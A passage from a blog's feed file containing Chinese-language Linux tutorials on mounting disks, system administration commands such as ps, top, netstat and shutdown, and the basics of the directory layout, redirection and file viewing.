<p>如果没有加上 -f 的选项，则由于这个文件系统不曾出现问题，检查的经过非常快速！若加上 -f 强制检查，才会一项一项的显示过程。</p>
<h4 id="磁盘挂载与卸除">磁盘挂载与卸除</h4>
<p>Linux 的磁盘挂载使用 <code>mount</code> 命令，卸载使用 <code>umount</code> 命令。</p>
<p>磁盘挂载语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mount <span class="selector-attr">[-t 文件系统]</span> <span class="selector-attr">[-L Label名]</span> <span class="selector-attr">[-o 额外选项]</span> <span class="selector-attr">[-n]</span>  装置文件名  挂载点</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>用默认的方式，将刚刚创建的 /dev/hdc6 挂载到 /mnt/hdc6 上面！</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># mkdir /mnt/hdc6</span></span><br><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># mount /dev/hdc6 /mnt/hdc6</span></span><br><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># df</span></span><br><span class="line">Filesystem           <span class="number">1</span>K-blocks      Used Available Use% Mounted on</span><br><span class="line">.....中间省略.....</span><br><span class="line"><span class="regexp">/dev/hdc</span>6              <span class="number">1976312</span>     <span class="number">42072</span>   <span class="number">1833836</span>   <span class="number">3</span>% <span class="regexp">/mnt/hdc</span>6</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>磁盘卸载命令 <code>umount</code> 语法：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">umount</span> [-<span class="meta">fn</span>] 装置文件名或挂载点</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f ：强制卸除！可用在类似网络文件系统 (NFS) 无法读取到的情况下；</p>
</li>
<li class="lvl-2">
<p>-n ：不升级 /etc/mtab 情况下卸除。</p>
</li>
</ul>
<p>卸载/dev/hdc6</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># umount /dev/hdc6     </span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】系统管理</title>
    <url>/posts/dd673edb/</url>
    <content><![CDATA[<h2 id="查看当前日历：cal">查看当前日历：cal</h2>
<p>cal命令用于查看当前日历，-y显示整年日历：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~$ cal</span><br><span class="line">      十一月 2019        </span><br><span class="line">日 一 二 三 四 五 六  </span><br><span class="line">                1  2  </span><br><span class="line"> 3  4  5  6  7  8  9  </span><br><span class="line">10 11 12 13 14 15 16  </span><br><span class="line">17 18 19 20 21 22 23  </span><br><span class="line">24 25 26 27 28 29 30 </span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="显示或设置时间：date">显示或设置时间：date</h2>
<p>设置时间格式（需要管理员权限）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span> [MMDDhhmm[[CC]YY][.ss]] +format</span><br></pre></td></tr></table></figure>
<p>MM为月，DD为天，hh为小时，mm为分钟；CC为年前两位，YY为年的后两位，ss为秒。</p>
<p>如： date 010203042016.55。</p>
<p>显示时间格式（date ‘+%y,%m,%d,%H,%M,%S’）：</p>
<table>
<thead>
<tr>
<th>format格式</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>%Y，%y</td>
<td>年</td>
</tr>
<tr>
<td>%m</td>
<td>月</td>
</tr>
<tr>
<td>%d</td>
<td>日</td>
</tr>
<tr>
<td>%H</td>
<td>时</td>
</tr>
<tr>
<td>%M</td>
<td>分</td>
</tr>
<tr>
<td>%S</td>
<td>秒</td>
</tr>
</tbody>
</table>
<h2 id="查看网络状态：netstat">查看网络状态：netstat</h2>
<p>netstat命令用于显示网络状态。</p>
<p>利用netstat指令可让你得知整个Linux系统的网络情况。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat [-acCeFghilMnNoprstuvVwx][-A&lt;网络类型&gt;][--ip]</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a或–all 显示所有连线中的Socket。</p>
</li>
<li class="lvl-2">
<p>-A&lt;网络类型&gt;或–&lt;网络类型&gt; 列出该网络类型连线中的相关地址。</p>
</li>
<li class="lvl-2">
<p>-c或–continuous 持续列出网络状态。</p>
</li>
<li class="lvl-2">
<p>-C或–cache 显示路由器配置的快取信息。</p>
</li>
<li class="lvl-2">
<p>-e或–extend 显示网络其他相关信息。</p>
</li>
<li class="lvl-2">
<p>-F或–fib 显示FIB。</p>
</li>
<li class="lvl-2">
<p>-g或–groups 显示多重广播功能群组组员名单。</p>
</li>
<li class="lvl-2">
<p>-h或–help 在线帮助。</p>
</li>
<li class="lvl-2">
<p>-i或–interfaces 显示网络界面信息表单。</p>
</li>
<li class="lvl-2">
<p>-l或–listening 显示监控中的服务器的Socket。</p>
</li>
<li class="lvl-2">
<p>-M或–masquerade 显示伪装的网络连线。</p>
</li>
<li class="lvl-2">
<p>-n或–numeric 直接使用IP地址，而不通过域名服务器。</p>
</li>
<li class="lvl-2">
<p>-N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。</p>
</li>
<li class="lvl-2">
<p>-o或–timers 显示计时器。</p>
</li>
<li class="lvl-2">
<p>-p或–programs 显示正在使用Socket的程序识别码和程序名称。</p>
</li>
<li class="lvl-2">
<p>-r或–route 显示Routing Table。</p>
</li>
<li class="lvl-2">
<p>-s或–statistice 显示网络工作信息统计表。</p>
</li>
<li class="lvl-2">
<p>-t或–tcp 显示TCP传输协议的连线状况。</p>
</li>
<li class="lvl-2">
<p>-u或–udp 显示UDP传输协议的连线状况。</p>
</li>
<li class="lvl-2">
<p>-v或–verbose 显示指令执行过程。</p>
</li>
<li class="lvl-2">
<p>-V或–version 显示版本信息。</p>
</li>
<li class="lvl-2">
<p>-w或–raw 显示RAW传输协议的连线状况。</p>
</li>
<li class="lvl-2">
<p>-x或–unix 此参数的效果和指定&quot;-A unix&quot;参数相同。</p>
</li>
<li class="lvl-2">
<p>–ip或–inet 此参数的效果和指定&quot;-A inet&quot;参数相同。</p>
</li>
</ul>
<p>常用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# netstat -nltp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      829/sshd            </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      829/sshd</span><br></pre></td></tr></table></figure>
<h2 id="查看进程信息：ps">查看进程信息：ps</h2>
<p>进程是一个具有一定独立功能的程序，它是操作系统动态执行的基本单元。</p>
<p><strong>ps命令选项：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ps a 显示现行终端机下的所有程序，包括其他用户的程序。</p>
</li>
<li class="lvl-2">
<p>ps -A 显示所有程序。</p>
</li>
<li class="lvl-2">
<p>ps c 列出程序时，显示每个程序真正的指令名称，而不包含路 径，参数或常驻服务的标示。</p>
</li>
<li class="lvl-2">
<p>ps -e 此参数的效果和指定&quot;A&quot;参数相同。</p>
</li>
<li class="lvl-2">
<p>ps e 列出程序时，显示每个程序所使用的环境变量。</p>
</li>
<li class="lvl-2">
<p>ps f 用ASCII字符显示树状结构，表达程序间的相互关系。</p>
</li>
<li class="lvl-2">
<p>ps -H 显示树状结构，表示程序间的相互关系。</p>
</li>
<li class="lvl-2">
<p>ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。</p>
</li>
<li class="lvl-2">
<p>ps s 采用程序信号的格式显示程序状况。</p>
</li>
<li class="lvl-2">
<p>ps u 以用户为主的格式来显示程序状况。</p>
</li>
<li class="lvl-2">
<p>ps x 显示所有程序，不以终端机来区分。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>显示终端上的所有进程，包括其他用户的进程</td>
</tr>
<tr>
<td>-u</td>
<td>显示进程的详细状态</td>
</tr>
<tr>
<td>-x</td>
<td>显示没有控制终端的进程</td>
</tr>
<tr>
<td>-w</td>
<td>显示加宽，以便显示更多的信息</td>
</tr>
<tr>
<td>-r</td>
<td>只显示正在运行的进程</td>
</tr>
</tbody>
</table>
<p><strong>常见用法：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ps -e 查看所有进程信息（瞬时的）</p>
</li>
<li class="lvl-2">
<p>ps -u root -N 查看所有不是root运行的进程</p>
</li>
<li class="lvl-2">
<p>ps ax 显示所有进程状态状态</p>
</li>
<li class="lvl-2">
<p>ps -ef |grep xxx 显示含有xxx的进程</p>
</li>
</ul>
<p>实例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ps -A</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">      1 ?        00:00:01 systemd</span><br><span class="line">      2 ?        00:00:00 kthreadd</span><br><span class="line">……省略部分结果</span><br><span class="line">   2207 ?        00:00:00 kworker/1:1-events</span><br><span class="line">   2208 ?        00:00:00 kworker/0:0-ata_sff</span><br><span class="line">   2215 ?        00:00:00 kworker/0:2-ata_sff</span><br><span class="line">   2217 pts/1    00:00:00 ps</span><br></pre></td></tr></table></figure>
<p>显示指定用户信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -u root //显示root进程用户信息</span></span><br><span class="line"> PID TTY     TIME CMD</span><br><span class="line">  1 ?    00:00:02 init</span><br><span class="line">  2 ?    00:00:00 kthreadd</span><br><span class="line">  3 ?    00:00:00 migration/0</span><br><span class="line">……省略部分结果</span><br><span class="line">30487 ?    00:00:06 gnome-terminal</span><br><span class="line">30488 ?    00:00:00 gnome-pty-helpe</span><br><span class="line">30489 pts/0  00:00:00 bash</span><br></pre></td></tr></table></figure>
<p>显示所有进程信息，连同命令行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -ef //显示所有命令，连带命令行</span></span><br><span class="line">UID    PID PPID C STIME TTY     TIME CMD</span><br><span class="line">root     1   0 0 10:22 ?    00:00:02 /sbin/init</span><br><span class="line">root     2   0 0 10:22 ?    00:00:00 [kthreadd]</span><br><span class="line">root     3   2 0 10:22 ?    00:00:00 [migration/0]</span><br><span class="line">root     4   2 0 10:22 ?    00:00:00 [ksoftirqd/0]</span><br><span class="line">root     5   2 0 10:22 ?    00:00:00 [watchdog/0]</span><br><span class="line">root     6   2 0 10:22 ?    /usr/lib/NetworkManager</span><br><span class="line">……省略部分结果</span><br><span class="line">root   31302 2095 0 17:42 ?    00:00:00 sshd: root@pts/2 </span><br><span class="line">root   31374 31302 0 17:42 pts/2  00:00:00 -bash</span><br><span class="line">root   31400   1 0 17:46 ?    00:00:00 /usr/bin/python /usr/sbin/aptd</span><br><span class="line">root   31407 31374 0 17:48 pts/2  00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
<h2 id="以树状图显示进程关系：pstree">以树状图显示进程关系：pstree</h2>
<p>显示进程的关系</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# pstree</span><br><span class="line">systemd─┬─NetworkManager───2*[&#123;NetworkManager&#125;]</span><br><span class="line">        ├─atd</span><br><span class="line">        ├─auditd───&#123;auditd&#125;</span><br><span class="line">        ├─crond</span><br><span class="line">        ├─dbus-daemon───&#123;dbus-daemon&#125;</span><br><span class="line">        ├─firewalld───&#123;firewalld&#125;</span><br><span class="line">        ├─irqbalance───&#123;irqbalance&#125;</span><br><span class="line">        ├─login───bash───su───bash───su───bash</span><br><span class="line">        ├─lsmd</span><br><span class="line">        ├─mcelog</span><br><span class="line">        ├─polkitd───5*[&#123;polkitd&#125;]</span><br><span class="line">        ├─smartd</span><br><span class="line">        ├─sshd─┬─sshd───sshd───bash</span><br><span class="line">        │      └─sshd───sshd───bash───pstree</span><br><span class="line">        ├─systemd───(sd-pam)</span><br><span class="line">        ├─systemd-journal</span><br><span class="line">        ├─systemd-logind</span><br><span class="line">        ├─systemd-udevd</span><br><span class="line">        └─tuned───3*[&#123;tuned&#125;]</span><br><span class="line">        </span><br><span class="line">[root@rocky8:~]# pstree -p</span><br><span class="line">systemd(1)─┬─NetworkManager(816)─┬─&#123;NetworkManager&#125;(821)</span><br><span class="line">           │                     └─&#123;NetworkManager&#125;(823)</span><br><span class="line">           ├─atd(835)</span><br><span class="line">           ├─auditd(768)───&#123;auditd&#125;(769)</span><br><span class="line">           ├─crond(841)</span><br><span class="line">           ├─dbus-daemon(796)───&#123;dbus-daemon&#125;(802)</span><br><span class="line">           ├─firewalld(797)───&#123;firewalld&#125;(1030)</span><br><span class="line">           ├─irqbalance(792)───&#123;irqbalance&#125;(801)</span><br><span class="line">           ├─login(838)───bash(2012)───su(2043)───bash(2044)───su(2072)───bash(2076)</span><br><span class="line">           ├─lsmd(793)</span><br><span class="line">           ├─mcelog(798)</span><br><span class="line">           ├─polkitd(1035)─┬─&#123;polkitd&#125;(1051)</span><br><span class="line">           │               ├─&#123;polkitd&#125;(1052)</span><br><span class="line">           │               ├─&#123;polkitd&#125;(1058)</span><br><span class="line">           │               ├─&#123;polkitd&#125;(1059)</span><br><span class="line">           │               └─&#123;polkitd&#125;(1072)</span><br><span class="line">           ├─smartd(790)</span><br><span class="line">           ├─sshd(829)─┬─sshd(1577)───sshd(1592)───bash(1593)</span><br><span class="line">           │           └─sshd(1859)───sshd(1863)───bash(1864)───pstree(2220)</span><br><span class="line">           ├─systemd(1582)───(sd-pam)(1586)</span><br><span class="line">           ├─systemd-journal(633)</span><br><span class="line">           ├─systemd-logind(794)</span><br><span class="line">           ├─systemd-udevd(662)</span><br><span class="line">           └─tuned(827)─┬─&#123;tuned&#125;(1168)</span><br><span class="line">                        ├─&#123;tuned&#125;(1217)</span><br><span class="line">                        └─&#123;tuned&#125;(1248)</span><br><span class="line">[root@rocky8:~]# pstree -c</span><br><span class="line">systemd─┬─NetworkManager─┬─&#123;NetworkManager&#125;</span><br><span class="line">        │                └─&#123;NetworkManager&#125;</span><br><span class="line">        ├─atd</span><br><span class="line">        ├─auditd───&#123;auditd&#125;</span><br><span class="line">        ├─crond</span><br><span class="line">        ├─dbus-daemon───&#123;dbus-daemon&#125;</span><br><span class="line">        ├─firewalld───&#123;firewalld&#125;</span><br><span class="line">        ├─irqbalance───&#123;irqbalance&#125;</span><br><span class="line">        ├─login───bash───su───bash───su───bash</span><br><span class="line">        ├─lsmd</span><br><span class="line">        ├─mcelog</span><br><span class="line">        ├─polkitd─┬─&#123;polkitd&#125;</span><br><span class="line">        │         ├─&#123;polkitd&#125;</span><br><span class="line">        │         ├─&#123;polkitd&#125;</span><br><span class="line">        │         ├─&#123;polkitd&#125;</span><br><span class="line">        │         └─&#123;polkitd&#125;</span><br><span class="line">        ├─smartd</span><br><span class="line">        ├─sshd─┬─sshd───sshd───bash</span><br><span class="line">        │      └─sshd───sshd───bash───pstree</span><br><span class="line">        ├─systemd───(sd-pam)</span><br><span class="line">        ├─systemd-journal</span><br><span class="line">        ├─systemd-logind</span><br><span class="line">        ├─systemd-udevd</span><br><span class="line">        └─tuned─┬─&#123;tuned&#125;</span><br><span class="line">                ├─&#123;tuned&#125;</span><br><span class="line">                └─&#123;tuned&#125;</span><br></pre></td></tr></table></figure>
<p>特别表明在运行的进程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pstree -apnh //显示进程间的关系</span></span><br></pre></td></tr></table></figure>
<p>同时显示用户名称：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pstree -u //显示用户名称</span></span><br></pre></td></tr></table></figure>
<h2 id="动态显示进程：top">动态显示进程：top</h2>
<p>top命令用来动态显示运行中的进程。top命令能够在运行后，在指定的时间间隔更新显示信息。-d参数可以指定显示信息更新的时间间隔。</p>
<p>在top命令执行后，可以按下按键得到对显示的结果进行排序：</p>
<table>
<thead>
<tr>
<th>按键</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>M</td>
<td>根据内存使用量来排序</td>
</tr>
<tr>
<td>P</td>
<td>根据CPU占有率来排序</td>
</tr>
<tr>
<td>T</td>
<td>根据进程运行时间的长短来排序</td>
</tr>
<tr>
<td>U</td>
<td>可以根据后面输入的用户名来筛选进程</td>
</tr>
<tr>
<td>K</td>
<td>可以根据后面输入的PID来杀死进程。</td>
</tr>
<tr>
<td>q</td>
<td>退出</td>
</tr>
<tr>
<td>h</td>
<td>获得帮助</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# top</span><br><span class="line">top - 15:40:09 up  4:53,  3 <span class="built_in">users</span>,  load average: 1.06, 0.72, 0.37</span><br><span class="line">Tasks: 161 total,   2 running, 159 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.2 us,  0.2 sy,  0.0 ni, 99.5 <span class="built_in">id</span>,  0.0 wa,  0.2 hi,  0.0 si,  0.0 st</span><br><span class="line">MiB Mem :   1746.4 total,   1230.0 free,    246.9 used,    269.5 buff/cache</span><br><span class="line">MiB Swap:   2068.0 total,   2068.0 free,      0.0 used.   1340.5 avail Mem </span><br><span class="line"></span><br><span class="line">    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                          </span><br><span class="line">    827 root      20   0  618180  31188  15248 S   0.3   1.7   0:30.76 tuned                                                            </span><br><span class="line">      1 root      20   0  175088  13464   9064 S   0.0   0.8   0:01.40 systemd                                                          </span><br><span class="line">      2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 kthreadd                                                         </span><br><span class="line">      3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp                                                           </span><br><span class="line">      4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_par_gp                                                       </span><br><span class="line">      5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 slub_flushwq </span><br><span class="line">      ..................</span><br></pre></td></tr></table></figure>
<p>更高级的命令是htop，但需要安装：</p>
<p><img src="/posts/dd673edb//image-20250220163058799.png" alt="htop动态进程"></p>
<h2 id="终止进程：kill">终止进程：kill</h2>
<p>kill命令指定进程号的进程，需要配合 ps 使用。</p>
<p>使用格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> [-signal] pid</span><br></pre></td></tr></table></figure>
<p>信号值从0到15，其中9为绝对终止，可以处理一般信号无法终止的进程。</p>
<h2 id="关机重启：reboot、shutdown、init">关机重启：reboot、shutdown、init</h2>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>reboot</td>
<td>重新启动操作系统</td>
</tr>
<tr>
<td>shutdown –r now</td>
<td>重新启动操作系统，shutdown会给别的用户提示</td>
</tr>
<tr>
<td>shutdown -h now</td>
<td>立刻关机，其中now相当于时间为0的状态</td>
</tr>
<tr>
<td>shutdown -h 20:25</td>
<td>系统在今天的20:25 会关机</td>
</tr>
<tr>
<td>shutdown -h +10</td>
<td>系统再过十分钟后自动关机</td>
</tr>
<tr>
<td>init 0</td>
<td>关机</td>
</tr>
<tr>
<td>init 6</td>
<td>重启</td>
</tr>
</tbody>
</table>
<h2 id="查看或配置网卡信息：ifconfig">查看或配置网卡信息：ifconfig</h2>
<p>ifconfig显示所有网卡的信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ifconfig</span><br><span class="line">ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.0.191  netmask 255.255.255.0  broadcast 10.0.0.255</span><br><span class="line">        inet6 fe80::20c:29ff:fee9:9fb3  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:e9:9f:b3  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 34362  bytes 34209026 (32.6 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 17179  bytes 1644986 (1.5 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 48  bytes 4080 (3.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 48  bytes 4080 (3.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>修改ip:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">sudo</span> ifconfig ens33 192.168.40.10</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】文件管理</title>
    <url>/posts/2d0621ba/</url>
    <content><![CDATA[<h2 id="Linux目录">Linux目录</h2>
<p><img src="/posts/2d0621ba//image-20250219153540620.png" alt="Linux目录"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>/：根目录，一般根目录下只存放目录，在Linux下有且只有一个根目录。所有的东西都是从这里开始。当你在终端里输入“/home”，你其实是在告诉电脑，先从/（根目录）开始，再进入到home目录。</p>
</li>
<li class="lvl-2">
<p>/bin: /usr/bin: 可执行二进制文件的目录，如常用的命令ls、tar、mv、cat等。</p>
</li>
<li class="lvl-2">
<p>/boot：放置linux系统启动时用到的一些文件，如Linux的内核文件：/boot/vmlinuz，系统引导管理器：/boot/grub。</p>
</li>
<li class="lvl-2">
<p>/dev：存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱 mount /dev/cdrom /mnt。</p>
</li>
<li class="lvl-2">
<p>/etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有 /etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d。</p>
</li>
<li class="lvl-2">
<p>/home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，表示当前用户的家目录，edu 表示用户 edu 的家目录。</p>
</li>
<li class="lvl-2">
<p>/lib: /usr/lib: /usr/local/lib：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助。</p>
</li>
<li class="lvl-2">
<p>/lost+fount：系统异常产生错误时，会将一些遗失的片段放置于此目录下。</p>
</li>
<li class="lvl-2">
<p>/mnt: /media：光盘默认挂载点，通常光盘挂载于 /mnt/cdrom 下，也不一定，可以选择任意位置进行挂载。</p>
</li>
<li class="lvl-2">
<p>/opt：给主机额外安装软件所摆放的目录。</p>
</li>
<li class="lvl-2">
<p>/proc：此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的目录有 /proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/* 等。</p>
</li>
<li class="lvl-2">
<p>/root：系统管理员root的家目录。</p>
</li>
<li class="lvl-2">
<p>/sbin: /usr/sbin: /usr/local/sbin：放置系统管理员使用的可执行命令，如fdisk、shutdown、mount 等。与 /bin 不同的是，这几个目录是给系统管理员 root使用的命令，一般用户只能&quot;查看&quot;而不能设置和使用。</p>
</li>
<li class="lvl-2">
<p>/tmp：一般用户或正在执行的程序临时存放文件的目录，任何人都可以访问，重要数据不可放置在此目录下。</p>
</li>
<li class="lvl-2">
<p>/srv：服务启动之后需要访问的数据目录，如 www 服务需要访问的网页数据存放在 /srv/www 内。</p>
</li>
<li class="lvl-2">
<p>/usr：应用程序存放目录，/usr/bin 存放应用程序，/usr/share 存放共享数据，/usr/lib  存放不能直接运行的，却是许多程序运行所必需的一些函数库文件。/usr/local: 存放软件升级包。/usr/share/doc:  系统说明文件存放目录。/usr/share/man: 程序说明文件存放目录。</p>
</li>
<li class="lvl-2">
<p>/var：放置系统执行过程中经常变化的文件，如随时更改的日志文件 /var/log，/var/log/message：所有的登录文件存放目录，/var/spool/mail：邮件存放的目录，/var/run:程序或服务启动后，其PID存放在该目录下。</p>
</li>
</ul>
<span id="more"></span>
<p>位于/home/user，称之为用户工作目录或家目录,表示方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/user</span><br><span class="line">~</span><br></pre></td></tr></table></figure>
<p>从/目录开始描述的路径为<strong>绝对路径</strong>，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span> /usr</span><br></pre></td></tr></table></figure>
<p>从当前位置开始描述的路径为<strong>相对路径</strong>，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line"><span class="built_in">ls</span> abc/def</span><br></pre></td></tr></table></figure>
<p>每个目录下都有**.和…**</p>
<p>. 表示当前目录</p>
<p>… 表示上一级目录，即父目录</p>
<p>根目录下的.和…都表示当前目录</p>
<h2 id="基础操作">基础操作</h2>
<h4 id="输出重定向：">输出重定向：&gt;</h4>
<p>可将本应显示在终端上的内容保存到指定文件中。</p>
<p>如：ls &gt; test.txt ( test.txt 如果不存在，则创建，存在则覆盖其内容 )</p>
<p>注意： <code>&gt;输出重定向会覆盖原来的内容，&gt;&gt;输出重定向则会追加到文件的尾部。</code></p>
<h4 id="管道：">管道：|</h4>
<p>管道：一个命令的输出可以通过管道做为另一个命令的输入。</p>
<p>“ | ”的左右分为两端，从左端写入到右端。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:/bin$ ll -h |more   </span><br><span class="line">总用量 13M</span><br><span class="line">drwxr-xr-x  2 root root  4.0K 8月   4  2016 ./</span><br><span class="line">drwxr-xr-x 26 root root  4.0K 7月  30  2016 ../</span><br><span class="line">-rwxr-xr-x  1 root root 1014K 6月  24  2016 bash*</span><br><span class="line">-rwxr-xr-x  1 root root   31K 5月  20  2015 bunzip2*</span><br><span class="line">-rwxr-xr-x  1 root root  1.9M 8月  19  2015 busybox*</span><br><span class="line">-rwxr-xr-x  1 root root   31K 5月  20  2015 bzcat*</span><br><span class="line">lrwxrwxrwx  1 root root     6 5月  16  2016 bzcmp -&gt; bzdiff*</span><br><span class="line">-rwxr-xr-x  1 root root  2.1K 5月  20  2015 bzdiff*</span><br><span class="line">lrwxrwxrwx  1 root root     6 5月  16  2016 bzegrep -&gt; bzgrep*</span><br><span class="line">--更多--</span><br></pre></td></tr></table></figure>
<h4 id="清屏：clear">清屏：clear</h4>
<p>clear作用为清除终端上的显示(类似于DOS的cls清屏功能)，快捷键：Ctrl + l ( “l” 为字母 )。</p>
<h4 id="切换工作目录：-cd">切换工作目录： cd</h4>
<p>Linux所有的目录和文件名大小写敏感</p>
<p>cd后面可跟绝对路径，也可以跟相对路径。如果省略目录，则默认切换到当前用户的主目录。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>cd</td>
<td>相当于cd ~</td>
</tr>
<tr>
<td>cd ~</td>
<td>切换到当前用户的主目录(/home/用户目录)</td>
</tr>
<tr>
<td>cd .</td>
<td>切换到当前目录</td>
</tr>
<tr>
<td>cd …</td>
<td>切换到上级目录</td>
</tr>
<tr>
<td>cd -</td>
<td>进入上次所在的目录</td>
</tr>
</tbody>
</table>
<h4 id="查看命令位置：which">查看命令位置：which</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~$ <span class="built_in">which</span> <span class="built_in">ls</span></span><br><span class="line">/bin/ls</span><br><span class="line">python@ubuntu:~$ <span class="built_in">which</span> <span class="built_in">sudo</span></span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>
<h2 id="查看文件内容">查看文件内容</h2>
<p>Linux系统中使用以下命令来查看文件的内容：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>cat 由第一行开始显示文件内容</p>
</li>
<li class="lvl-2">
<p>tac 从最后一行开始显示</p>
</li>
<li class="lvl-2">
<p>nl 显示的时候，顺道输出行号</p>
</li>
<li class="lvl-2">
<p>more 一页一页的显示文件内容</p>
</li>
<li class="lvl-2">
<p>less与more 类似，但可以往前翻页</p>
</li>
<li class="lvl-2">
<p>head 只看头几行</p>
</li>
<li class="lvl-2">
<p>tail 只看尾巴几行</p>
</li>
</ul>
<h4 id="基本显示：cat、tac">基本显示：cat、tac</h4>
<p>语法：</p>
